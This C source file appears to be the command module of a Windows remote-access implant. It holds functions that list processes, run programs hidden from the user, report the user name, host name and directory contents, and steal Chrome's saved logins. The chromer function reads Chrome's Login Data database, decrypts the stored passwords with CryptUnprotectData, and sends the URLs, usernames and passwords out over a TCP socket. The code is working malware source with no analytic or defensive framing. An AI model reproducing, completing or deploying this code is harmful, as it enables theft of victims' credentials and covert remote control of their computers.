#include "cmd.h"
// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
// and compile with -DPSAPI_VERSION=1
//use -lpsapi to compile

int lolps(char* returnval)
{
	// Get the list of process identifiers.
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
	{
		return 1;
	}
	strcat(returnval, "\n-- List of Identified Processes --\n");
	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);
	// Print the name and process identifier for each process.

	for ( i = 0; i < cProcesses; i++ )
	{
		if ( aProcesses[i] != 0 )
		{
			//PrintProcessNameAndID( aProcesses[i] );
			DWORD processID = aProcesses[i];
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
			// Get a handle to the process.
			HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
			                               PROCESS_VM_READ,
			                               FALSE, processID );
			// Get the process name.
			if (NULL != hProcess )
			{
				HMODULE hMod;
				DWORD cbNeeded;
				if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod),
				                         &cbNeeded) )
				{
					GetModuleBaseName( hProcess, hMod, szProcessName,
					                   sizeof(szProcessName) / sizeof(TCHAR) );
				}
			}
			// Print the process name and identifier.
			if (strcmp(szProcessName, "<unknown>"))
			{
				char res[50] = "";

				snprintf(res, sizeof(res), "%s [PID: %u]", szProcessName, processID );
				strcat(returnval, res);
				strcat(returnval, "\n");

			}
			// Release the handle to the process.
			CloseHandle( hProcess );
		}
	}
	return 0;
}

void exec(char* returnval, int returnsize, char *fileexec)
{
	// std::cout << fileexec << std::endl;
	if (32 >= (int)(ShellExecute(NULL, "open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
	{
		strcat(returnval, "[x] Error executing command..\n");
	}
	else
	{
		strcat(returnval, "\n");
	}
}

void whoami(char* returnval, int returnsize)
{
	DWORD bufferlen = 257;
	GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize)
{
	DWORD bufferlen = 257;
	GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize)
{
	TCHAR tempvar[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, tempvar);
	strcat(returnval, tempvar);
}



void dir(char* returnval) {
	DIR *mydir;
	struct dirent *myfile;
	struct stat mystat;

	mydir = opendir(".");
	while ((myfile = readdir(mydir)) != NULL)
	{
		char res[50] = "";
		stat(myfile->d_name, &mystat);
		snprintf(res, sizeof(res), "%d  %s", mystat.st_size, myfile->d_name);
		strcat(returnval, res);
		strcat(returnval, "\n");

	}
	closedir(mydir);
}


//-----CHROME IMPL----

char *crackPass(BYTE *pass) {
	DATA_BLOB in;
	DATA_BLOB out;

	BYTE tmp[1024];
	memcpy(tmp, pass, 1024);
	int size = sizeof(tmp) / sizeof(tmp[0]);

	in.pbData = pass;
	in.cbData = size + 1;
	char str[1024] = "";
	char *s_ptr = str;

	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
		for (int i = 0; i < out.cbData; i++)
			str[i] = out.pbData[i];
		str[out.cbData] = '\0';

		if (str[0] == '\0')
			return NULL;

		return s_ptr;
	}
	else
		return NULL; //Error on decryption
}


int chromer(SOCKET tcpsock) {

	char filename[150];
	char *buffer = (char*)malloc(100000);
	strcat(filename, "C:\\Users\\");
	char user[25];
	DWORD nUsernameSize = sizeof(user);
	GetUserName(user, &nUsernameSize);
	strcat(filename, user);
	strcat(filename, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
	char *err = (char*)malloc(50);
	int rc;
	sqlite3_stmt *stmt;
	sqlite3 *db;

	char const *query = "SELECT origin_url, username_value, password_value FROM logins";
	//Open the database
	if (sqlite3_open(filename, &db) == SQLITE_OK) {
		if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
			//Lets begin reading data
			while (sqlite3_step(stmt) == SQLITE_ROW) {
				//While we still have data in database
				char *url = (char *)sqlite3_column_text(stmt, 0);
				char *username = (char *)sqlite3_column_text(stmt, 1);
				BYTE *password = (BYTE *)sqlite3_column_text(stmt, 2);
				sprintf(buffer+strlen(buffer),"Url: %s\n", url);
				sprintf(buffer+strlen(buffer),"Username: %s\n", username);
				char *decrypted = crackPass(password);
				sprintf(buffer+strlen(buffer),"Password: %s\n\n", decrypted);
			}
		}
		else {
			sprintf(err, "Error Executing Query\n");
			send(tcpsock, err, strlen(err)+1, 0);
    		memset(err, 0, sizeof(err));
			return 0;  //error exec query
		}
		sprintf(buffer + strlen(buffer), "\n");
		
		sqlite3_finalize(stmt);
		sqlite3_close(db);
	}
	else {
		sprintf(err, "Error Opening Database, Could be Locked\n");
		send(tcpsock, err, strlen(err)+1, 0);
    	memset(err, 0, sizeof(err));
		return 0; //error opening database
	}
	send(tcpsock, buffer, strlen(buffer)+1, 0);
    memset(buffer, 0, sizeof(buffer));

	return 0;
}